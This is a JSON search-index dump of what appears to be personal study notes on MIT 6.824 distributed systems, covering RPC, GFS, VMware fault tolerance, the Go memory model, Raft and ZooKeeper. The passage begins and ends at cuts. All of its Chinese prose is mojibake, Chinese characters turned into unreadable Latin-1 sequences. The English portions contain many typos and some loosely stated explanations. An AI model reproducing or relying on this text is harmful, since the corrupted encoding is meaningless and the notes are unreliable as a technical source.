\\Sigma\u0026rsquo;$$ï¼Œè€ƒè™‘ $$R_1\u0026rsquo;$$ åœ¨ f ä¸‹åŸåƒçš„é›†åˆ $$f^{-1}$$ æ˜¯ $$\\Sigma\u0026rsquo; \\rightarrow \\Sigma$$ çš„æ˜ å°„ã€‚\nè®¾ $$R_1 \\in \\Sigma, R_1 \\sub f^{-1}(f(R_1))$$ï¼Œè‹¥æœ‰ $$\\forall u \\in f^{-1}(f(R_1)), \\exist v \\in R_1, s.t. f(v)=f(u) \\Rightarrow f(v - u) = 0, u -v \\in K \\in R_1 \\Rightarrow u \\in R_1$$\nå› æ­¤ $$R_1 = f^{-1}(f(R_1))$$\nï¼ˆ2ï¼‰\n"},{"id":241,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F-mit8.624/1.introduction/","title":"1. Introduction","section":"åˆ†å¸ƒå¼ç³»ç»Ÿ","content":"Introduction #  åˆ†å¸ƒå¼ç³»ç»Ÿçš„ä¼˜ç‚¹ï¼š\n Parallelismï¼šé€šè¿‡å¹¶è¡Œæé«˜è®¡ç®—é‡ã€æ•°æ®å¤„ç†é‡ï¼› Fault Tolerateï¼šé€šè¿‡å¤šä¸ªæœåŠ¡å™¨æå‡å®¹é”™ç‡ï¼› Physicallyï¼šèšåˆç‰©ç†æ„ä¹‰ä¸Šç›¸äº’éš”ç¦»çš„æœºå™¨ï¼› Securityï¼šç³»ç»Ÿå¯ä»¥åˆ†å¸ƒå¼åœ°è¿è¡Œåœ¨åœ°ç†ä½ç½®ç›¸èšå¾ˆè¿œçš„åœ°æ–¹ï¼Œæå‡å®¹ç¾æ€§ï¼›  åˆ†å¸ƒå¼ç³»ç»Ÿçš„ç¼ºç‚¹ä¸å›°éš¾ï¼š\n Concurrent Partsï¼šéœ€è¦åŒæ—¶å¹¶è¡Œåœ°å¤„ç†å¤šä¸ªéƒ¨åˆ†ï¼› Complex Interactionsï¼šéœ€è¦å¤„ç†å¤æ‚çš„æœåŠ¡äº¤äº’é€»è¾‘ï¼ˆå¾®æœåŠ¡ä¸­é€šè¿‡â€œæœåŠ¡å‘ç°â€å®ç°åˆ†å¸ƒå¼ç³»ç»Ÿï¼‰ï¼› Partial Failureï¼šæ— æ³•åŒæ—¶è¾¾åˆ°ç»å¯¹å‡†ç¡®æ€§ä¸æœåŠ¡å¯ç”¨æ€§ï¼› Performanceï¼šéœ€è¦è®¾è®¡ç²¾å·§çš„ç®—æ³•ä»¥å®ç°æ›´é«˜çš„æ€§èƒ½ï¼›  MapReduce æ˜¯â€œåˆ†å¸ƒå¼ç³»ç»Ÿâ€çš„å¼€å±±è®ºæ–‡ï¼Œå®ƒæœ€åˆè¢« Google ç ”å‘å‡ºæ¥ï¼Œç”¨äºè§£å†³å¤§å®¹é‡çš„ç½‘é¡µé—®é¢˜ï¼šhttp://nil.csail.mit.edu/6.824/2020/papers/mapreduce.pdf\n"},{"id":242,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F-mit8.624/2.infra-rpc/","title":"2. Infra Rpc","section":"åˆ†å¸ƒå¼ç³»ç»Ÿ","content":"Infrastrcture: RPC and threads #  ä¸ºä»€ä¹ˆè¦é€‰æ‹© Go è¯­è¨€ï¼Ÿ\n é€šè¿‡ go ä¸ goroutine å¯¹å¹¶å‘æœ‰å¾ˆå¥½çš„æ”¯æŒï¼› ç®€æ˜“çš„ RPC æ¡†æ¶ï¼› ç±»å‹å®‰å…¨ï¼ˆç›¸å¯¹äº jsã€python è¿™ç±»çš„è„šæœ¬è¯­è¨€ï¼‰ï¼› è‡ªåŠ¨åƒåœ¾å›æ”¶ï¼ˆæ²¡æœ‰ UAF æ¼æ´ï¼‰ï¼› ç›¸å¯¹ç®€å•çš„è¯­æ³•ï¼ˆå·¥ä¸šç•Œéœ€è¦ä¸€ä¸ªåƒ python ä¸€æ ·ç®€å•è¯­æ³•çš„ç¼–è¯‘å‹è¯­è¨€ï¼‰ï¼›  å¤šçº¿ç¨‹çš„æŒ‘æˆ˜ï¼š\n Share Dataï¼šGolang ä¸­ä½¿ç”¨ sync.Mutexï¼Œå°½é‡é¿å…å…±äº«å¯å˜é‡ï¼› Coordinationï¼šGlang ä½¿ç”¨ channelã€sync.Condã€WaitGroupï¼› Deallockï¼šçº¿ç¨‹é—´çš„å¾ªç¯ç­‰å¾…ï¼›  lock/channel åº”è¯¥åœ¨ä»€ä¹ˆæ—¶å€™ï¼Ÿ\n ä¸€ä¸ªç»“è®ºæ˜¯ï¼šå¤§éƒ¨åˆ†çš„å¤šçº¿ç¨‹é—®é¢˜å¯ä»¥é€šè¿‡ä¸Šé¢ä¸¤ä¸ªå·¥å…·è§£å†³ï¼› ä»€ä¹ˆæ—¶å€™ä½¿ç”¨å“ªä¸ªå·¥å…·å–å†³äºç¨‹åºå‘˜çš„æ€è€ƒï¼Œä¸€ä¸ªå»ºè®®æ˜¯ï¼š  state çŠ¶æ€å…±äº«æ—¶ï¼šä½¿ç”¨ lockï¼› communication çº¿ç¨‹é—´ä¿¡æ¯äº¤æµæ—¶ï¼šä½¿ç”¨ channelï¼›    RPCï¼šRemote Procedure Callï¼›\n Client \u0026ldquo;best effort\u0026rdquo;ï¼šå½“æœåŠ¡ç«¯æ— å“åº”æ—¶ï¼Œå¤šè¿›è¡Œå‡ æ¬¡å°è¯•åæŠ›å‡ºå¼‚å¸¸ï¼› Server \u0026ldquo;at most once\u0026rdquo;ï¼šå®¢æˆ·ç«¯å¯¹æ¯æ¬¡è¯·æ±‚æ·»åŠ  xid å”¯ä¸€è¡¨ç¤ºï¼ŒæœåŠ¡ç«¯é€šè¿‡ xid å»é‡ï¼›  "},{"id":243,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F-mit8.624/3.gfs/","title":"3. Gfs","section":"åˆ†å¸ƒå¼ç³»ç»Ÿ","content":"Google File System (Distribute Storage) #  åˆ†å¸ƒå¼å­˜å‚¨çš„å›°éš¾ç‚¹ï¼š\n é«˜æ€§èƒ½ï¼šHigh performance in many server; å¤šæœºå™¨ï¼šSystem with many machine could cause \u0026ldquo;constant fault\u0026rdquo;; ä¸€è‡´æ€§é”™è¯¯ï¼šTo avoid contact fault, we will need replication; æ•°æ®åŒæ­¥ï¼šDuring the replication, potential inconsistencies will occur; ä¸€è‡´æ€§ä¸é«˜æ€§èƒ½çŸ›ç›¾ï¼šTo get better consistency, low performance occur;  åˆ†å¸ƒå¼å­˜å‚¨çš„ä¸€ä¸ªå¤§çš„è¯¾é¢˜å°±æ˜¯åœ¨â€œä¸€è‡´æ€§â€ä¸â€œé«˜æ€§èƒ½â€ä¹‹é—´çš„ tradeoff.\nGFS Masterï¼š\n RAM ä¸­å­˜å‚¨ï¼š  ä¸€ä¸ª filename åˆ° handlers array çš„æ˜ å°„è¡¨ï¼› æ¯ä¸ª handler éƒ½åŒ…å« version/chunk servers list/primary/least time ä¿¡æ¯ï¼›   ç£ç›˜ä¸­å­˜å‚¨ç€ log/checkpointï¼›  READï¼Œå®¢æˆ·ç«¯è¯»å–æµç¨‹ï¼š\n C send filename and offset to the master M; M finds chunk handle for that offset; M replies list of chunkservers(aka CS) only with lastest versions; C caches this response; C sends request to nearest CS with offset; CS read the chuck file from disk and returns;  APPENDï¼Œå®¢æˆ·ç«¯è¿½åŠ æµç¨‹ï¼š\n  C ask M about filename\u0026rsquo;s last chunk;\n  If M see filename has no primary hanlder:\n Pick a primary(aka P) and secondaries(aka S) with latest version (Only these server was allowed to handle storing filename); Increment lastest version; Tell P/S who they are;    M response C with primary, secondaries and version;\n  C sends append data to all:\n The paper change thier tone after, C only sends data to the nearest replica and chain the data to all replicas which can reduce trans cost;    C tells primary P to execute append;\n  P checks that lease hasn\u0026rsquo;t expired, and chunk has space. And then P picks an offset (at end of chunk), writes chunk file (a Linux file) at the offset;\n  P tells each secondary the offset, tells to exexute append to chunk file\n  P waits for all secondaries to reply, or timeout;\n  P tells C \u0026ldquo;ok\u0026rdquo; or \u0026ldquo;error\u0026rdquo;. C retries from start if error\n  Split Brain é—®é¢˜ï¼š\n æè¿°ï¼šä¸€ä¸ª filename åŒæ—¶å¯¹åº”äº†å¤šä¸ª primary å¤„ç†ï¼› åŸå› ï¼šé€šå¸¸æ˜¯å› ä¸º network partition å¯¼è‡´çš„ï¼ˆéƒ¨åˆ†æœºå™¨ä¹‹é—´æ— æ³•é€šä¿¡ï¼‰ï¼› è§£å†³æ–¹æ¡ˆï¼šåœ¨æŒ‡æ´¾ primary æ—¶åŒæ—¶æŒ‡æ´¾ä¸€ä¸ª lease è¡¨ç¤ºè¿‡æœŸæ—¶é—´ï¼Œmaster ä¸ primary åŒæ—¶ç»´æŠ¤è¿™ä¸ªè¿‡æœŸæ—¶é—´ï¼Œè¿‡æœŸå master é‡æ–°æŒ‡æ´¾ primaryï¼›  æ€»ç»“ï¼šGFS ä¼˜ç‚¹ï¼š\n Global cluster file system as universal infrastructure; Seperation of naming system (master) and storage system (chunk servers) Sharding file into chunk for parallel throughput; Huge files/chunks to reduce overheads; Designation primary to achieve sequential writes; Lease to prevent split-brain chunk servers primaries;  GFS ç¼ºç‚¹ï¼š\n Single master performance: ran out of RAM and CPU Chunkservers not very efficient for small files Lack of automatic fail-over to master replica; Maybe consistency was too relaxed  "},{"id":244,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F-mit8.624/4.vm-ft/","title":"4. Vm Ft","section":"åˆ†å¸ƒå¼ç³»ç»Ÿ","content":"VMware FT(Fault-Tolerant) #  Primary/Backup Replication #  Two main replication approaches:\n State Transfer: Primary replica executes and sends new state to backups machine; Replicated State Machine: Primary just pass the raw external event to backups. Mostly used by recent industry and papers;  Overview:\n VM-FT consist of two machine: primary and backup. Primary deals with all external events and replicates it to backup through \u0026ldquo;logging channel\u0026rdquo;; VM-FT emulates a local disk interface through two remote disk server.  Log Entry #  events can\u0026rsquo;t determine all situation, FT must handle the following divergence:\n æŒ‡ä»¤æœ¬èº«çš„å·®å¼‚ï¼šMost instructions execute identically; æœºå™¨æ‰€å¤„å¤–éƒ¨çš„ä¿¡å·å·®å¼‚ï¼šInput from external world: network packet, DMA data, OS interrupt, etc; å¹¶ä¸æ˜¯æ‰€æœ‰æŒ‡ä»¤éƒ½æ˜¯çŠ¶æ€æŒ‡ä»¤ï¼ˆå”¯ä¸€è¾“å…¥å”¯ä¸€è¾“å‡ºçš„çº¯å‡½æ•°ï¼‰ã€‚æ¯”å¦‚ï¼šè¯»å–å½“å‰æ—¶é—´ã€éšæœºæ•°å‘ç”Ÿå™¨ï¼ˆæŸç§æ„ä¹‰ä¸Šè¯´ä¸å‰è€…æ˜¯ä¸€ç±»ï¼‰ï¼› å¹¶å‘ä¸å¤šæ ¸ï¼šParallelism and multi-core races;  ä¸ºäº†ä½¿å¾— pirmary å’Œ backup çš„çŠ¶æ€å®Œå…¨ä¸€æ ·ï¼Œæˆ‘ä»¬å°±å¿…é¡»è¦å¤„ç†ä¸Šé¢åˆ—ä¸¾çš„ä¸€äº›å¼‚å¸¸æƒ…å†µï¼Œåœ¨å®ƒä»¬é€šä¿¡æ—¶å°†è¿™äº›ä¿¡æ¯ä¼ é€’å‡ºå»ä½¿å¾—å®ƒä»¬æ‰§è¡Œçš„ä»£ç å®Œå…¨ä¸€æ ·ã€‚\nSo the log entry who transfers message between Primary and Backup should contain these message below:\n Instruction number, interrupt type, interrupt data; Example:  When executing the 120120(instruction number) instruction since boot; Program get network packet (interrupt type); Carrying a tcp hand shake ACK (interrupt data);    Timer Interrupt #   How does FT handle timer interrupts?\n Goal: Make sure primary and backup should see interrupt at totally same situation;\nPrimary should do:\n FT fields the timer interrupt; FT reads instruction number X from CPU; FT send instruction number X on the logging channel to Backup; FT delivers interrupt to Primary and resume executing;  Backup should do:\n Ignores its own timer hardware; Backup see instruction number X from logging channel before the exact instruction executed; FT tells CPU to \u0026ldquo;interrupt me at instruction X\u0026rdquo;; FT mimics a timer interrupt to Backup;  Network Interrupt #   How does FT handle arrival of network packet?\n Goal: Exactly same as timer interrupt, with data designating.\nPrimary should do:\n Boosting: Tells NIC (Network Interface Controller) to copy packet data into FT\u0026rsquo;s private \u0026ldquo;bounce buffer\u0026rdquo;; At some point, NIC does DMA then interrupt:  FT pause the primary; FT copies the \u0026ldquo;bound buffer\u0026rdquo; into Primary\u0026rsquo;s memory; FT simulates a NIC interrupt in Primary; FT send \u0026ldquo;packet data\u0026rdquo; and \u0026ldquo;instruction number\u0026rdquo; to Backup through log channel;    Backup should do:\n Backup received instruction number from log stream; FT tells CPU to interrupt at instruction X; FT copies the data to backup memory and similates NIC interrupt in Backup;  Bounce Buffer #  What bounce buffer?\n Bounce buffer is a FT\u0026rsquo;s memory area that store network packet data;  Why bounce buffer?\n We want the data to appear in memory at exactly the same point in execution of the Primary and Backup;  More Rule #  Output Rule #  Suppose we encountered the following situation:\n Primary crashes jsut after sending the reply to client; Backup doesn\u0026rsquo;t receive any event from Primary because it has crashed;  Output rule was brought up to deal with this:\n Primary should repsonse to client after receiving ACKnowledgement from Backup;  Split Brain #  Suppose we encounter the following situation:\n Network between Primary and Backup has been cut overï¼› So both machine think the other one is dead, and think it\u0026rsquo;s the Primary and stop sending logging event;  This is a common problem called \u0026ldquo;split brain\u0026rdquo;. FT creat a center server support atomic test-and-set instruction, machine who get flag can become Primary.\nSummary #  When might FT be attractive?\n  Critical but low-intensity services: name server;\n  Services whose software is not convenient to modify;\n  What about replication for high-throughput services?\n Recommend: Applicative-level replicated state machines;  Example: Database state machine, database only support a limit set of command which is easier to transfer message;   Result: less fine-grained synchronization (æ›´ç»†ç²’åº¦çš„åŒæ­¥), less overhead;  "},{"id":245,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F-mit8.624/5.go-raft/","title":"5. Go Raft","section":"åˆ†å¸ƒå¼ç³»ç»Ÿ","content":" Go Memory Model: https://golang.org/ref/mem\n Go Threads and Raft #  Happens Before #  Hanpens Beforeï¼Œä¸ºäº†æ·±å…¥ç ”ç©¶åŒæ­¥é—®é¢˜è€Œæå‡ºçš„æ¦‚å¿µï¼š\n å…³äºä¸€ä¸ªå˜é‡ v çš„è¯»è¯­å¥ r ä¸å†™è¯­å¥ wï¼Œr å¯ä»¥å¾—åˆ° w çš„å€¼éœ€è¦æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š  r does not happene before w; There is not other w' that happens before r and after w;   ä¸€ä¸ªè¯»è¯­å¥ v èƒ½å¤Ÿå‡†ç¡®åœ°æ•è·åˆ°æŸä¸ªç‰¹å®šçš„ w è¯­å¥çš„å€¼ï¼Œéœ€è¦æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š  w happends before r; Any other w' to v either hanppends before w or after r;    Golang Lifetime #  Initialization, ä¸€ä¸ª golang ç¨‹åºçš„åˆå§‹åŒ–ï¼š\n å¯¹äºåº“ p å¼•ç”¨åº“ q çš„æƒ…å†µï¼Œp çš„åˆå§‹åŒ–å‡½æ•°å¼€å§‹åœ¨ q çš„åˆå§‹åŒ–å‡½æ•°ç»“æŸä¹‹å‰ï¼› åœ¨å‡½æ•° main.main æ‰§è¡Œå‰ï¼Œæ‰€æœ‰å‡½æ•°çš„ init å‡½æ•°éƒ½åº”è¯¥æ‰§è¡Œå®Œæˆäº†ï¼›  Goroutine destructionï¼š\n  Goroutine çš„é”€æ¯ä¸ä¼šè¢«ä¿è¯å‘ç”Ÿåœ¨ä»»ä½•äº‹ä»¶ä¹‹å‰ï¼ˆnot guaranteed to happen before any eventï¼‰ã€‚æ€ä¹ˆç†è§£è¿™ä¸ª happened before å‘¢ï¼Ÿæ¯”å¦‚ä¸‹é¢è¿™ä¸ªä¾‹å­ï¼š\n  var a string func hello() { \tgo func() { a = \u0026#34;hello\u0026#34; }() \tprint(a) } å…¶ä¸­ï¼Œa çš„èµ‹å€¼è¯­å¥å‘ç”Ÿåœ¨ä¸€ä¸ªå•ç‹¬çš„ goroutine ä¸­ï¼Œå®ƒä¹‹åæ²¡æœ‰ä»»ä½•åŒæ­¥è¯­å¥ï¼Œæ‰€ä»¥å®ƒæœ‰å¯èƒ½ä¸ä¼šè¢«ä»»ä½•äº‹ä»¶ä½¿ç”¨ï¼Œæ¿€è¿›ä¸€ç‚¹çš„ç¼–è¯‘å™¨ä¼šç›´æ¥æ‹’ç»ç¼–è¯‘ã€‚\n  Communication #  Golang ä¸­çº¿ç¨‹åŒæ­¥çš„æ–¹æ³•ã€‚\nChannel #  Example:\nvar c = make(chan int) var a string  func f() { \ta = \u0026#34;hello, world\u0026#34; \t\u0026lt;-c }  func main() { \tgo f() \tc \u0026lt;- 0 \tprint(a) } è¿™æ®µä»£ç ä¸€å®šä¼šè¾“å‡º hello worldï¼Œå› ä¸ºæ ¹æ®ä¸Šé¢çš„ç†è®ºï¼š\n a = \u0026quot;hello world\u0026quot; happends before \u0026lt;- c happends before f() happends before print(a);  Locks #  Example:\nvar l sync.Mutex var a string  func f() { \ta = \u0026#34;hello, world\u0026#34; \tl.Unlock() }  func main() { \tl.Lock() \tgo f() \tl.Lock() \tprint(a) } ä¸Šé¢è¿™æ®µä»£ç ä¸€å®šä¼šè¾“å‡º hello worldï¼Œå› ä¸ºæ ¹æ®ç†è®ºï¼š\n a = \u0026quot;hello world\u0026quot; happends before ç¬¬ä¸€ä¸ª l.Unlock() happens before ç¬¬äºŒä¸ª l.Lock() happens before print(a);  Once #  Example:\nvar a string var once sync.Once  func setup() { \ta = \u0026#34;hello, world\u0026#34; }  func doprint() { \tonce.Do(setup) \tprint(a) }  func twoprint() { \tgo doprint() \tgo doprint() } ä¸Šé¢è¿™ä¸ªä»£ç ä¸­ä¿è¯äº† setup è¿™ä¸ªå‡½æ•°åªèƒ½è¢«è°ƒç”¨ä¸€æ¬¡ï¼Œå¹¶ä¸” print ä¸€å®šä¼šè¾“å‡º hello world å‡½æ•°ï¼Œè¿™æ˜¯å› ä¸º once.Do ä¿è¯äº†æ¯æ¬¡è°ƒç”¨éƒ½ä¼šåœ¨ç¬¬ä¸€è°ƒç”¨ç»“æŸä¹‹åã€‚\n"},{"id":246,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F-mit8.624/6.raft/","title":"6. Raft","section":"åˆ†å¸ƒå¼ç³»ç»Ÿ","content":" è®ºæ–‡åœ°å€ï¼šhttps://raft.github.io/raft.pdf\n Raft #  Split Brain #  ä¹‹å‰å­¦ä¹ è¿‡çš„ç³»ç»Ÿä¸­ï¼š\n MapReduceï¼šreplicates computation but relies on a single master to organize; GFSï¼šreplicates data but relies on the master to pick primaries; VMwareFTï¼šreplicates service but relies on test-and-set to pick primary;  ä¸Šé¢è¿™äº›ç³»ç»Ÿåœ¨åšæ ¸å¿ƒå†³ç­–çš„æ—¶å€™éƒ½éœ€è¦ä¾èµ–å•ä¸€çš„æœºå™¨ï¼Œä¹Ÿå°±æ˜¯é€šè¿‡å•ä¸€çš„æœºå™¨é¿å… Split Brain é—®é¢˜ã€‚\nä¸ºä»€ä¹ˆä¼šå‡ºç° Split Brain é—®é¢˜å‘¢ï¼Ÿ\n æ ¹æœ¬åŸå› åœ¨äºè®¡ç®—æœºä¹‹é—´æ— æ³•åŒºåˆ† server crashed ä¸ network broken è¿™ä¸¤ä¸ªæƒ…å†µã€‚ æ¯”å¦‚ï¼šä¸€ä¸ªç³»ç»Ÿä¸­çš„ä¸€ä¸ªæœºå™¨ A æ— æ³•ä¸å¦ä¸€ä¸ªæœºå™¨ B é€šä¿¡äº†ï¼Œå¦‚æœ A è®¤ä¸º B æ˜¯å®•æœºäº†è€Œå®é™…ä¸Šæ˜¯ç½‘ç»œé”™è¯¯ï¼Œåä¹‹äº¦ç„¶ã€‚A/B å°±åˆ†è£‚æˆäº†ä¸¤ä¸ªç‹¬ç«‹çš„æœåŠ¡ï¼Œå®ƒä»¬éƒ½è®¤ä¸ºå¯¹æ–¹å®•æœºè€Œè‡ªå·±ç»§ç»­æœåŠ¡å®¢æˆ·ç«¯è¯·æ±‚ï¼›  \u0026ldquo;Split Brain\u0026rdquo; caused by \u0026ldquo;network partition\u0026rdquo; seemed insurmountable for a long time:\n  Previous Solution:\n A outside agent (a human) to decide when to cut over; A single perfectly reliable server (as in previous chapter); A perfectly reliable network, so no response will be congruent to crashed;    But all we face are single points of failure (not desirable);\n  Raft copes with partition by \u0026ldquo;Majority Vote\u0026rdquo;ã€‚å¤šæ•°æŠ•ç¥¨æœºåˆ¶å¹¶ä¸æ˜¯ä¸€ä¸ªå¯ä»¥é…ç½®çš„ 50%ï¼Œä¸æ˜¯éšä¾¿æƒ³å‡ºæ¥çš„ä¸€ä¸ªæ•°å­—ï¼Œå®ƒé‡Œé¢åŒ…å«äº†è®¸å¤šå¾®å¦™çš„æ€æƒ³ï¼š\n At most one partition can have a majority (eg: 2f+1 can tolerate f failed servers) Any two terms must intersect (æŠ½å±‰åŸç†); Any command log in history must exist in one term (åŒæ ·æ˜¯æŠ½å±‰åŸç†);  Before Raft, two partition-tolerant replication schemes were invented around 1990:\n Paxos and View-Stamped Replication  Overview #  Time Diagram of Raft System handles client-command:\n  Client:\n Clients only interact with the leader as long as the Leader stays up; Clients can\u0026rsquo;t see follower states or logs; Reason: distributed system should mimicing a single server;    Leader:\n Client sends command to Leader; Leader add command to log; Leader sends AppendEntries RPCs to Followers; Leader waits for replies from a bare majority (including itself) entry is committed; Leader executes the command, replies to client; Commit info will send back to Followers in next AppendEntries RPCs;    Followers:\n Follower adds command to log once it receive the AppendEntries; Follower execute the command only if it know the Leader has executes the command;    Why the logs?\n The log orders the commands, to ensure replicas agree on a single execution order; In case: Leader must re-send to Followers; In case mache crash: persistent commands can be replay after reboot;  Some replicas may lag in logs, but whey\u0026rsquo;ll eventually coverage to be identical;\nLeader Election #  Leader ensures all replicas execute the same commands in the same order.\nDifferent leader mark by term number, any term number will only have one leader at most.\nWhen election start?\n Follower doesn\u0026rsquo;t hear from current Leader for an \u0026ldquo;election timeout\u0026rdquo;, increments local currentTerm, try to collect votes;  What happens if an elections doesn\u0026rsquo;t succeed?\n Wait for another \u0026ldquo;election timeout\u0026rdquo;, a new election with higher term takes precedence.  Split votes problem:\n é—®é¢˜ï¼š  å¦‚æœæ‰€æœ‰ Candidates åŒæ—¶åˆ°è¾¾ \u0026ldquo;election timeout\u0026rdquo;ï¼Œé‚£ä¹ˆå®ƒä»¬éƒ½å°†æŠŠç¥¨æŠ•ç»™è‡ªå·±ï¼Œé‚£ä¹ˆè¿™ä¸ªç³»ç»Ÿå°†æ°¸è¿œæ— æ³•é€‰ä¸¾å‡ºæ–°çš„ Leader;   è§£å†³æ–¹æ¡ˆï¼š  Each server picks a random election timeout, one will choose lowest random delay (randomized delays are a common pattern in network protocols); Least timeout: A few heartbeat intervals to avoid needless elections, short enough to react quickly to failure (avoid long pauses); Least interval: Long enough to let one candidate succeed before next starts; Max timeout: The max tolerant time system stop;    Raft Log #  Storage format:\n æ¯ä¸ªæœåŠ¡å™¨ç»´æŠ¤è‡ªå·±çš„æ“ä½œæ—¥å¿—ï¼Œæ—¥å¿—çš„çš„å†…å®¹æ˜¯æ“ä½œæœ¬èº«ï¼› æ¯ä¸ªæ—¥å¿—éƒ½è¢«æ”¾åœ¨ä¸€ä¸ªé€’å¢çš„ log slot ä¸­ï¼ŒåŒæ—¶è¿˜ä¿å­˜äº†è¿™ä¸ªæ—¥å¿—å‘ç”Ÿçš„ termï¼ˆä¹Ÿå°±æ ‡è®°äº†è¿™ä¸ªæ—¥å¿—æ˜¯ç”±å“ªä¸ª Leader å¤„ç†çš„ï¼‰ï¼›  æ–°ä¸Šä»»çš„ Leader å‘ç°æ—¥å¿—ä¸ä¸€è‡´ï¼Œæ€ä¹ˆåšï¼Ÿ\n Raft forces agreement by having Followers adopt new Leader\u0026rsquo;s log; å…·ä½“ç­–ç•¥ï¼š  Leader æ¯æ¬¡å‘é€ AppendEntries åŒ…ä¼šå¸¦ä¸Šæ—¥å¿—çš„ prevLogIndex ä¸ prevLogTermï¼› å½“ Follower å‘ç° prevLog å€¼ä¸åŒ¹é…æ—¶ä¼šå“åº” falseï¼› Leader æ”¶åˆ°å“åº”å¤±è´¥æ—¶ä¼šå°† prev å€’é€€ä¸€æ¬¡å†æ¬¡å‘é€ï¼Œä¸€è‡´å¾ªç¯ç›´åˆ°å“åº” trueï¼› å½“ Follower åŒ¹é…åˆ° prevLog å€¼æ—¶ä¼šåˆ é™¤è¿™ä¸ª log åçš„æ‰€æœ‰æ—¥å¿—åé‡æ–°æ¥å— Leader çš„æ—¥å¿—ï¼›   ä»¥ä¸Šç­–ç•¥åªæ˜¯ä¸€ä¸ªç®€åŒ–ç‰ˆæœ¬ï¼Œæ˜¾ç„¶æˆ‘ä»¬å¯ä»¥é€šè¿‡æ›´å°‘çš„äº¤äº’ rollback quickerï¼›  å¦‚ä½•ç¡®ä¿ Follower çš„å†—ä½™æ—¥å¿—æ˜¯å¯ä»¥åˆ é™¤çš„ï¼Œè¿™ç­‰ä»·äº Leader çš„æ—¥å¿—æ˜¯å®Œæ•´çš„ï¼š\n é€šè¿‡é€‰ä¸¾ç­–ç•¥ç¡®ä¿ Leader çš„æ—¥å¿—æ˜¯å®Œæ•´çš„ï¼Œåªæœ‰åœ¨ä»¥ä¸‹æƒ…å†µä¸‹ï¼ŒæœåŠ¡å™¨çš„ RequestVote æ‰ä¼šç»™ Candidateï¼š  Candidate has higher term in last log entry; Candidate has same last term and (same length or longer log);   è¿™ä¸ªç­–ç•¥ç¡®ä¿äº†è¢«ç«é€‰ä¸Šçš„ Leader æœ‰ç€æ¯”ä¸€åŠä»¥ä¸ŠæœåŠ¡å™¨æ›´æ–°æˆ–ç›¸ç­‰çš„æ—¥å¿—ï¼›  Persistence #  What would we like to happen after a server crashes?\n Raft system should continue handle client request with one missing server. Failed server must be repaired soon to avoid dipping below a majority.  The strategy that Raft uses is to reboot crashed server.\nRaft server persistent value for restarting:\n log[]: If a server was in leader\u0026rsquo;s majority for committing an entry, it must remember entry despite reboot, so any future leader is guaranteed to see the committed log entry. ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ä»æ¯ä¸ªæœåŠ¡å™¨çš„æ‰€æœ‰æŒä¹…åŒ–æ—¥å¿—ä¸­ï¼Œèƒ½å¤Ÿå‡†ç¡®çš„è¿˜åŸå‡ºâ€œåˆ†å¸ƒå¼ç³»ç»Ÿâ€å®Œæˆçš„å¯¹å¤–å“åº”æ—¥å¿—ï¼› voteFor: To prevent a server vote for multiple candidates in one term; currentTerm: To ensure terms only increase;  How does the service recover its state after a crash+reboot?\n Easy approach: start with empty state and re-play all logs; Faster optimize: use Raft snapshot and replay just the tail of log;  Log Compaction \u0026amp;\u0026amp; Snapshots #  Discard log:\n  Problem: Log will get to be huge, which will take a long time to re-play on reboot or send to a new server;\n  Solution: Service periodically creates persistent \u0026ldquo;snapshot\u0026rdquo;, and discard previous log.\nNotice: Can\u0026rsquo;t discard entries that un-executed or un-committed.\n  What if follower\u0026rsquo;s log ends before leader\u0026rsquo;s log starts?\n Leader reparirs that follower with InstallSnapshot RPC instead of AppendEntries RPC  Linearizability #  Linearizability (or \u0026ldquo;strong\u0026rdquo; consistentcy) is the most common and instuitive definition formalizes behavior expected of a single server.\nDefinition: An execution history is linearizable if:\n One can find a total order of all operations, that matches real-time; And in which each read sees the value from the write preceding it in the order;   Example see: http://nil.csail.mit.edu/6.824/2020/notes/l-raft2.txt\n Duplicate RPC Detection #  "},{"id":247,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F-mit8.624/7.zookeeper/","title":"7. Zoo Keeper","section":"åˆ†å¸ƒå¼ç³»ç»Ÿ","content":" Paper: https://www.usenix.org/legacy/event/atc10/tech/full_papers/Hunt.pdf\n ZooKeeper #  What questions does this paper shed light on?\n  æˆ‘ä»¬æ˜¯å¦èƒ½å°† Raft ä¸­æåˆ°çš„æœåŠ¡é—´åˆä½œå°è£…æˆä¸€ä¸ªé€šç”¨çš„æœåŠ¡ï¼Ÿ\nå¦‚æœå¯ä»¥ï¼ŒAPI åº”è¯¥è®¾è®¡æˆä»€ä¹ˆæ ·ï¼Ÿå…¶ä»–çš„åˆ†å¸ƒå¼ç³»ç»Ÿåº”è¯¥æ€ä¹ˆä½¿ç”¨è¿™ä¸ªæœåŠ¡ï¼Ÿ\n  æˆ‘ä»¬åœ¨ä¸€ä¸ªåˆ†å¸ƒå¼ç³»ç»Ÿæ€»æŠ•å…¥äº† N å€çš„æœºå™¨ï¼Œèƒ½å¤Ÿå¾—åˆ° N å€çš„æ€§èƒ½æå‡ï¼Ÿ\n  Performance #  Raftï¼šåœ¨æ·»åŠ äº†æ›´å¤šçš„ replicas ä¹‹åï¼Œå› ä¸º Leader 